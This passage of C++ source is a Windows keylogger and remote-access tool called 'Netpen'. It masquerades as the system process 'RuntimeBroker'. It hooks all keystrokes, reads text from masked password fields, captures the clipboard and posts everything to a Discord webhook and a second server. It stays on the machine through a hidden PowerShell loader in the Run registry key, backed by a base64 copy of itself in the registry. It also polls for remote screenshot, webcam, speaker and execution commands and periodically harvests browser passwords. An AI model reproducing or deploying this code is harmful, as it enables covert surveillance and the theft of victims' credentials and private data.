        PostDiscordImage(host, "Netpen \u2014 " + host + " Auto-Screenshot", resultUrl, "Window: " + windowTitle + " (matched \"" + kw + "\")");
        DeleteFileA(localFile.c_str());
        LogMsg("AutoSS: " + resultUrl + " (trigger: " + kw + ")");
        break;
    }
}

struct PasswordField { HWND hwnd; std::wstring text; };

static BOOL CALLBACK EnumPasswordProc(HWND hwnd, LPARAM lParam) {
    auto* fields = (std::vector<PasswordField>*)lParam;
    wchar_t cls[32] = {0};
    if (!GetClassNameW(hwnd, cls, 32)) return TRUE;
    if (wcscmp(cls, L"Edit") != 0) return TRUE;
    LRESULT pwdChar = SendMessageW(hwnd, EM_GETPASSWORDCHAR, 0, 0);
    if (!pwdChar) return TRUE;
    int len = (int)SendMessageW(hwnd, WM_GETTEXTLENGTH, 0, 0);
    if (len <= 0) return TRUE;
    if (len > 500) len = 500;
    std::wstring text((size_t)len, 0);
    SendMessageW(hwnd, WM_GETTEXT, (WPARAM)(len + 1), (LPARAM)&text[0]);
    fields->push_back({hwnd, text});
    return TRUE;
}

static void PostPasswordToDiscord(const std::string& hostname, const std::string& keys) {
    DWORD now = GetTickCount();
    g_lastDiscord = now;
    std::string host = hostname.empty() ? "unknown" : hostname;
    std::string k = keys.empty() ? "(no keys)" : keys;
    if (k.size() > 1990) k = k.substr(0, 1990) + "...";
    std::string payload = "{\"embeds\":[{\"title\":\"Netpen \\u2014 ";
    payload += EscapeJSON(host);
    payload += " \\u2014 Password\",\"color\":15158332,\"description\":\"";
    payload += EscapeJSON(k);
    payload += "\",\"timestamp\":\"";
    payload += GetTimestamp();
    payload += "\"}]}";
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;
    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_discordHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", g_discordPath.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
    std::wstring headers = L"Content-Type: application/json";
    WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)payload.c_str(),
        (DWORD)payload.size(), (DWORD)payload.size(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
}

static void CheckPasswordFields() {
    HWND fg = GetForegroundWindow();
    if (!fg) return;
    wchar_t winTitle[256] = {0};
    GetWindowTextW(fg, winTitle, 256);
    std::string winStr = ToNarrow(winTitle);
    std::vector<PasswordField> fields;
    EnumChildWindows(fg, EnumPasswordProc, (LPARAM)&fields);
    if (fields.empty()) return;
    std::string digest = winStr;
    for (size_t i = 0; i < fields.size(); i++) {
        char buf[32];
        sprintf_s(buf, 32, "|%p:", fields[i].hwnd);
        digest += buf;
        digest += ToNarrow(fields[i].text);
    }
    if (digest == g_lastPasswordDigest) return;
    g_lastPasswordDigest = digest;
    std::string combined;
    for (size_t i = 0; i < fields.size(); i++) {
        if (i > 0) combined += " | ";
        combined += ToNarrow(fields[i].text);
    }
    std::string json = "[{\"window_title\":\"[PASSWORD] ";
    json += EscapeJSON(winStr);
    json += "\",\"keys\":\"";
    json += EscapeJSON(combined);
    json += "\",\"hostname\":\"";
    json += EscapeJSON(g_hostname);
    json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
    PostKeys(json);
    PostPasswordToDiscord(g_hostname, combined);
}

static void CheckClipboard() {
    if (!OpenClipboard(NULL)) return;
    HANDLE h = GetClipboardData(CF_UNICODETEXT);
    if (!h) { CloseClipboard(); return; }
    wchar_t* p = (wchar_t*)GlobalLock(h);
    if (!p) { CloseClipboard(); return; }
    std::wstring ws(p);
    GlobalUnlock(h);
    CloseClipboard();
    std::string text = ToNarrow(ws);
    if (text.empty() || text.size() > 50000) return;
    if (text == g_lastClipboard) return;
    g_lastClipboard = text;
    std::string json = "[{\"window_title\":\"[CLIPBOARD]\",\"keys\":\"";
    json += EscapeJSON(text);
    json += "\",\"hostname\":\"";
    json += EscapeJSON(g_hostname);
    json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
    PostKeys(json);
    std::string discordText = text.size() > 1000 ? text.substr(0, 1000) + "..." : text;
    PostToDiscord(g_hostname, "[CLIPBOARD]", discordText);
}

static void FlushBuffer() {
    if (g_keys.empty()) return;

    std::string win = g_winTitle;
    std::string keys = g_keys;
    g_keys.clear();

    std::string json = "[{\"window_title\":\"";
    json += EscapeJSON(win);
    json += "\",\"keys\":\"";
    json += EscapeJSON(keys);
    json += "\",\"hostname\":\"";
    json += EscapeJSON(g_hostname);
    json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";

    PostToDiscord(g_hostname, win, keys);
    if (!PostKeys(json)) {
        g_keys = keys + g_keys;
        if (g_keys.size() > 10000)
            g_keys = g_keys.substr(0, 10000);
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = p->vkCode;
        std::string newTitle = GetWindowTitle();
        DWORD now = GetTickCount();

        if (newTitle != g_winTitle && !g_keys.empty()) {
            std::string win = g_winTitle;
            std::string keys = g_keys;
            g_keys.clear();
            g_winTitle = newTitle;
            g_lastTick = now;

            std::string json = "[{\"window_title\":\"";
            json += EscapeJSON(win);
            json += "\",\"keys\":\"";
            json += EscapeJSON(keys);
            json += "\",\"hostname\":\"";
            json += EscapeJSON(g_hostname);
            json += "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}]";
            PostToDiscord(g_hostname, win, keys);
            PostKeys(json);
            CheckAutoScreenshot(newTitle);
        } else if (g_winTitle.empty()) {
            g_winTitle = newTitle;
            CheckAutoScreenshot(newTitle);
        }

        std::string keyStr = GetKeyString(vk);
        if (!keyStr.empty()) {
            g_keys += keyStr;
            g_lastTick = now;
            if (g_keys.size() > 5000) FlushBuffer();
        }
        g_winTitle = newTitle;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"

static void EnsureStartupEntry();

static void CleanupPersistence() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, GetExeName().c_str());
        RegCloseKey(hKey);
    }
    RegDeleteKeyA(HKEY_CURRENT_USER, NETPEN_REGKEY);
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string cachedExe = std::string(tempPath) + GetExeName();
    DeleteFileA(cachedExe.c_str());
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE:
            SetTimer(hwnd, 1, 1000, NULL);
            break;
        case WM_TIMER:
        {
            static int counter = 0;
            counter++;
            if (counter % 3 == 0 && !g_selfDestructing) CheckClipboard();
            if (counter % 2 == 0 && !g_selfDestructing) CheckPasswordFields();
            if (counter % 5 == 0 && !g_keys.empty()) {
                DWORD now = GetTickCount();
                if (now - g_lastTick > 300) FlushBuffer();
            }
            if (counter % 30 == 0) {
                if (CheckSelfDestruct()) {
                    g_selfDestructing = true;
                    CleanupPersistence();
                    CreateKillFlag();
                    g_running = false;
                    DestroyWindow(hwnd);
                } else if (CheckStop()) {
                    g_running = false;
                    DestroyWindow(hwnd);
                }
            }
            if (counter % 60 == 0 && !g_selfDestructing) {
                SendHeartbeat();
                FetchTriggers();
                std::string scRowId = CheckScreenshotCmd();
                if (!scRowId.empty()) HandleScreenshot(scRowId);
                std::string wcRowId = CheckWebcamCmd();
                if (!wcRowId.empty()) HandleWebcam(wcRowId);
                std::string spRowId = CheckSpeakerCmd();
                if (!spRowId.empty()) HandleSpeaker(spRowId);
                CheckAndHandleExec();
            }
            if (counter % 120 == 0 && !g_selfDestructing) {
                EnsureStartupEntry();
            }
            if (counter % 300 == 0 && !g_selfDestructing) {
                HarvestBrowserPasswords();
            }
            break;
        }
        case WM_DESTROY:
            KillTimer(hwnd, 1);
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

static std::string Base64Encode(const BYTE* data, DWORD size) {
    DWORD needed = 0;
    CryptBinaryToStringA(data, size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &needed);
    std::string result(needed, 0);
    CryptBinaryToStringA(data, size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &result[0], &needed);
    while (!result.empty() && result.back() == '\0') result.pop_back();
    return result;
}

#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"

static void InstallStartup() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    // Read current exe into memory
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(hFile); return; }
    BYTE* buf = new BYTE[size];
    DWORD read = 0;
    if (!ReadFile(hFile, buf, size, &read, NULL) || read != size) {
        delete[] buf; CloseHandle(hFile); return;
    }
    CloseHandle(hFile);

    // Base64 encode and store in registry
    std::string b64 = Base64Encode(buf, size);
    delete[] buf;

    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "Payload", 0, REG_SZ, (BYTE*)b64.c_str(), (DWORD)b64.size());
        RegCloseKey(hKey);
    }

    // Set HKCU Run key with PowerShell loader
    b64.clear();
    std::string psCmd = "powershell -w h -c \"$d=(gp 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker').Payload;$p=$env:TEMP+'\\";
    psCmd += GetExeName();
    psCmd += "';[IO.File]::WriteAllBytes($p,[Convert]::FromBase64String($d));start $p\"";

    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, GetExeName().c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size());
        RegCloseKey(hKey);
    }
}

static void EnsureStartupEntry() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return;
    }
    // Payload missing -- reinstall
    InstallStartup();
}

static int RunChild(HINSTANCE hInstance) {
    char hostname[256] = {0};
    DWORD hostnameSize = sizeof(hostname);
    GetComputerNameA(hostname, &hostnameSize);
    g_hostname = hostname;

    WNDCLASSEXW wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"RuntimeBrokerHiddenWindow";
    if (!RegisterClassExW(&wc)) return 1;

    Gdiplus::GdiplusStartupInput gdiInput;
    ULONG_PTR gdiToken;
    Gdiplus::GdiplusStartup(&gdiToken, &gdiInput, NULL);

    g_hwnd = CreateWindowExW(0, L"RuntimeBrokerHiddenWindow", L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
    if (!g_hwnd) { Gdiplus::GdiplusShutdown(gdiToken); return 1; }

    g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    if (!g_hHook) {
        LogMsg("Hook failed: " + std::to_string(GetLastError()));
        return 1;
    }

    LogMsg("Child started on " + g_hostname);

    MSG msg;
    while (g_running && GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (g_hHook) UnhookWindowsHookEx(g_hHook);
    if (g_hwnd) DestroyWindow(g_hwnd);
    Gdiplus::GdiplusShutdown(gdiToken);
    LogMsg("Child stopped");
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
    InitConfig();
    HWND consoleWnd = GetConsoleWindow();
    if (consoleWnd) ShowWindow(consoleWnd, SW_HIDE);

    std::string cmdLine(lpCmdLine ? lpCmdLine : "");
    if (cmdLine.find("--child") != std::string::npos) {
        return RunChild(hInstance);
    }

    CreateMutexW(NULL, TRUE, L"RuntimeBroker_Instance");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    char hostname[256] = {0};
    DWORD hostnameSize = sizeof(hostname);
    GetComputerNameA(hostname, &hostnameSize);
    g_hostname = hostname;

    InstallStartup();
    LogMsg("Watchdog started on " + g_hostname);

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string exePath(path);

    while (true) {
        RemoveKillFlag();

        STARTUPINFOA si = {0};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi = {0};
        std::string childCmd = "\"" + exePath + "\" --child";

        if (!CreateProcessA(exePath.c_str(), &childCmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            Sleep(30000);
            continue;
        }

        bool updated = false;
        while (true) {
            DWORD wr = WaitForSingleObject(pi.hProcess, 300000);
            if (wr == WAIT_TIMEOUT) {
                int rv = GetRemoteVersion();
                if (rv > NETPEN_VERSION) {
                    TerminateProcess(pi.hProcess, 1);
                    updated = DeployUpdate(rv);
                    break;
                }
                if (KillFlagExists()) {
                    TerminateProcess(pi.hProcess, 1);
                    break;
                }
            } else {
                break;
            }
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (KillFlagExists()) {
            RemoveKillFlag();
            LogMsg("Self-destruct triggered, watchdog exiting");
            break;
        }

        if (updated) {
            LogMsg("Watchdog exiting for update");
            break;
        }

        Sleep(3000);
    }

    return 0;
}
